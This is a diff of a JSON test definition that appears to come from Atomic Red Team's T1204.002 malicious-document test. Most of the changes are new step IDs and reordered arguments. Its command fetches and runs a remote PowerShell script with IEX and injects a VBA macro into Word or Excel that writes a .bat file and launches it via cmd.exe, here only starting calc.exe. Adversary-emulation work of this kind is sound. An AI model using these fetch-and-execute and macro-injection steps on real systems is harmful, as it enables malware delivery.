@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "31af763b-082f-48f5-9559-c066c9fb5ef2",
+      "id": "371d9d2b-2012-42e0-817e-69a316a7e1e2",
       "type": "execute-command",
       "data": {
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{bat_path}`\" For Output As #1`n   Write #1, `\"calc.exe`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c #{bat_path} `\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "69f01282-af8e-409a-a087-e0818fdc6de6",
+      "id": "ea10ffde-c2bd-484d-bbfb-dc6ebd14e488",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item #{bat_path} -ErrorAction Ignore\nGet-Process | Where-Object { $_.MainModule.FileName -like \"*calculator*\" } | Stop-Process",
@@ -25,7 +25,7 @@
       "elevation_required": false
     },
     {
-      "id": "e052640f-1918-4e38-9dd6-791e284ab3df",
+      "id": "0ddf7ac6-5c4e-4823-8351-a00f2fd28f29",
       "name": "Check dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
@@ -36,7 +36,7 @@
       "elevation_required": false
     },
     {
-      "id": "5f0f4cba-58a8-4390-b632-bd7971cf3c8c",
+      "id": "bb375aaf-72fb-43d2-b7da-5fba16494f15",
       "name": "Resolve dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
@@ -47,7 +47,7 @@
       "elevation_required": false
     },
     {
-      "id": "f5d9fd20-5f02-41c0-85d4-bf2a8def1eb6",
+      "id": "0fd6e31b-b304-4df7-97ae-5ea7d2c0424a",
       "name": "Re-check dependency 1/1",
       "description": "Microsoft #{ms_product} must be installed\n",
       "type": "execute-command",
@@ -60,34 +60,34 @@
   ],
   "flows": [
     {
-      "s": "31af763b-082f-48f5-9559-c066c9fb5ef2",
+      "s": "371d9d2b-2012-42e0-817e-69a316a7e1e2",
       "p": "on-success",
-      "o": "69f01282-af8e-409a-a087-e0818fdc6de6"
+      "o": "ea10ffde-c2bd-484d-bbfb-dc6ebd14e488"
     },
     {
-      "s": "31af763b-082f-48f5-9559-c066c9fb5ef2",
+      "s": "371d9d2b-2012-42e0-817e-69a316a7e1e2",
       "p": "on-failure",
-      "o": "69f01282-af8e-409a-a087-e0818fdc6de6"
+      "o": "ea10ffde-c2bd-484d-bbfb-dc6ebd14e488"
     },
     {
-      "s": "e052640f-1918-4e38-9dd6-791e284ab3df",
+      "s": "0ddf7ac6-5c4e-4823-8351-a00f2fd28f29",
       "p": "on-success",
-      "o": "31af763b-082f-48f5-9559-c066c9fb5ef2"
+      "o": "371d9d2b-2012-42e0-817e-69a316a7e1e2"
     },
     {
-      "s": "e052640f-1918-4e38-9dd6-791e284ab3df",
+      "s": "0ddf7ac6-5c4e-4823-8351-a00f2fd28f29",
       "p": "on-failure",
-      "o": "5f0f4cba-58a8-4390-b632-bd7971cf3c8c"
+      "o": "bb375aaf-72fb-43d2-b7da-5fba16494f15"
     },
     {
-      "s": "5f0f4cba-58a8-4390-b632-bd7971cf3c8c",
+      "s": "bb375aaf-72fb-43d2-b7da-5fba16494f15",
       "p": "on-success",
-      "o": "f5d9fd20-5f02-41c0-85d4-bf2a8def1eb6"
+      "o": "0fd6e31b-b304-4df7-97ae-5ea7d2c0424a"
     },
     {
-      "s": "f5d9fd20-5f02-41c0-85d4-bf2a8def1eb6",
+      "s": "0fd6e31b-b304-4df7-97ae-5ea7d2c0424a",
       "p": "on-failure",
-      "o": "31af763b-082f-48f5-9559-c066c9fb5ef2"
+      "o": "371d9d2b-2012-42e0-817e-69a316a7e1e2"
     }
   ],
   "tags": [
@@ -96,16 +96,16 @@
   ],
   "input_arguments": [
     {
-      "name": "ms_product",
-      "type": "string",
-      "description": "Maldoc application Word or Excel",
-      "value": "Word"
-    },
-    {
       "name": "bat_path",
       "type": "string",
       "description": "Path to malicious .bat file",
       "value": "$(\"$env:temp\\art1204.bat\")"
+    },
+    {
+      "name": "ms_product",
+      "type": "string",
+      "description": "Maldoc application Word or Excel",
+      "value": "Word"
     }
   ]
 }
